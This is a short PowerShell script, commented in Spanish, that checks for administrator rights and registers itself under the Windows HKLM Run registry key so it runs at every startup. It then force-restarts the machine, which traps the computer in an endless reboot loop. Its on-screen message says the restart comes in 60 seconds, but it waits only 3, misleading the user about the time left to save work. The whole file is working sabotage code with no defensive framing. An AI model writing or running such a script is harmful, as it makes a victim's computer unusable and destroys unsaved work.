#Loop de reinicio del Sistema en bucle cada vez que inicie
function Restart-ComputerLoop {
    # Mensaje de notificación antes del reinicio
    Write-Output "El sistema se reiniciará en 60 segundos. Guarda tu trabajo."
    Start-Sleep -Seconds 3
    Restart-Computer -Force
}
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Debes ejecutar este script de PowerShell como administrador."
    exit
}
$scriptPath = $MyInvocation.MyCommand.Definition
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "RestartLoopScript"

New-ItemProperty -Path $regPath -Name $regName -Value $scriptPath -PropertyType String -Force | Out-Null
Restart-ComputerLoop
